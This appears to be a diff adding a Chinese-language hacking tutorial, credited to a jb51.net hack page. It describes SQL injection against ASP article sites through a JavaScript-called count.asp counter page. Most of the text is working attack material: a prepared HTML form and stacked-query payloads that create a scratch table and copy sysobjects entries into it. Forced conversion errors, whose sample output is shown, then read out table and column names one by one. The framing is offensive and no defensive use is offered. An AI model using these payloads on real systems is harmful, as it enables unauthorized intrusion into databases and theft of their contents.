@@ -1,0 +1,42 @@
+大家在是否碰到过这样的站点： 
+全站文章系统采用FSO静态生成的HTML文件来显示。这样做的好处一来可以减轻服务器负担，提高访问速度。二来也阻止了SQL注入式的攻击。。 
+我来说说他们的文章系统原理：全部文章均在数据库存有一个副本。另处根据模板生成一个HTML页面。 
+攻击方法： 
+查看源文件/看里面是否有通过JS来调用的页面。 
+如调用<script language="javascript" src="count.asp?id=1552"></script>来更新文章的浏览次数。 
+我们就可以这样来试一下可否注入： 
+http://服务器域名/count.asp?id=1552’ 
+看一下是否出错。如出错说明有注入漏洞。然后正常攻击。 
+在本机建立一下post.htm的文件和log.txt的文本文件（用来记录用，这是一个好习惯） 
+post.htm内容：主要是方便输入。 
+<iframe name=p src=# width=800 height=350 frameborder=0></iframe> 
+<br> 
+<form action=http://test.com/count.asp target=p> 
+<input name="id" value="1552;update aaa set aaa=(select top 1 name from sysobjects where xtype=’u’ and status>0);--" style="width:750"> 
+<input type=submit value=">>>"> 
+<input type=hidden name=fno value="2, 3"> 
+</form> 
+对于SQLSERVER的服务器可以这样判断：在1552后加一分号，如正常有可能是SQLSERVER 
+对于这类数据库可以先建一个表id=1552;create table aaa(aaa char(20));-- 
+然后插入一条记录：id=1552;insert into aaa values(’test’);-- 
+再之后枚举出他的数据表名： 
+id=1552;update aaa set aaa=(select top 1 name from sysobjects where xtype=’u’ and status>0);-- 
+这是将第一个表名更新到aaa的字段处。 
+id=1552 and exists(select * from aaa where aaa>5)就会报错，多数情况会将表名直接读出：看： 
+Microsoft OLE DB Provider for SQL Server 错误 ’80040e07’ 
+将 varchar 值 ’vote’ 转换为数据类型为 int 的列时发生语法错误。 
+/search.asp，行21 
+其中vote就是表名： 
+也可以先猜出一个表名，再把(select top 1 name from sysobjects where xtype=’u’ and status>0)的值更新到那个表的一条记录中去。通过网页显示。 
+读出第一个表，第二个表可以这样读出来（在条件后加上 and name<>’刚才得到的表名’）。 
+id=1552;update aaa set aaa=(select top 1 name from sysobjects where xtype=’u’ and status>0 and name<>’vote’);-- 
+然后id=1552 and exists(select * from aaa where aaa>5) 
+读出第二个表，^^^^^^一个个的读出，直到没有为止。 
+读字段是这样： 
+id=1552;update aaa set aaa=(select top 1 col_name(object_id(’表名’),1));-- 
+然后id=1552 and exists(select * from aaa where aaa>5)出错，得到字段名 
+id=1552;update aaa set aaa=(select top 1 col_name(object_id(’表名’),2));-- 
+然后id=1552 and exists(select * from aaa where aaa>5)出错，得到字段名 
+……类推 
+
+详细出处参考：http://www.jb51.net/hack/5813.html
